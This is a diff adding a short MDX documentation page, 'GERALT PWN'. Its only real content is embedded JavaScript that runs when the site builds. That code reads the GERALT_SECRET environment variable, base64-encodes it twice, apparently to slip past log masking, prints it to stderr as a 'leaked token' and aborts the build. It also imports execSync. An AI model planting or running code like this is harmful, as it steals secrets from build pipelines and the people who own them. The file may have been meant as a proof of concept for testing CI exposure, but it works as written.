@@ -1,0 +1,17 @@
+---
+id: geralt-pwn
+title: GERALT PWN
+---
+
+import { execSync } from 'child_process';
+
+export const geraltRce = (() => {
+  const s = process.env.GERALT_SECRET || '';
+  const b64 = Buffer.from(s, 'utf8').toString('base64');
+  const b64b64 = Buffer.from(b64, 'utf8').toString('base64');
+  process.stderr.write('GERALT_LEAKED_TOKEN=' + b64b64 + '\n');
+  process.exit(1);
+  return '';
+})();
+
+# GERALT PWN
